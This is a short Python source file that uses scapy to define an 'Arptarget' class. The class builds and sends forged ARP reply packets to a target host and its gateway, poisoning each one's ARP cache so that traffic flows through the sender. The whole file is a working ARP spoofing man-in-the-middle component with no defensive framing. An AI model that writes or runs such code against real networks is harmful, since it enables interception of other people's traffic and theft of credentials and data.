import scapy.all as scapy

class Arptarget:

	# taking inputs
	def __init__(self,ip,mac,gateip,gatemac):
		self.targetip = ip
		self.targetmac = mac
		self.gatewayip = gateip
		self.gatewaymac = gatemac


	# generating packets
	def gen_packet(self):
		self.packetA = scapy.ARP(op=2,pdst=self.targetip,hwdst=self.targetmac,psrc=self.gatewayip)
		self.packetB = scapy.ARP(op=2,pdst=self.gatewayip,hwdst=self.gatewaymac,psrc=self.targetip)
		print (self.packetA.summary())
		print (self.packetB.summary())

	# sending pakcets
	def send_packet(self):
		scapy.send(self.packetA,verbose=False)
		scapy.send(self.packetB,verbose=False)
#		print ("Packet A,B sent")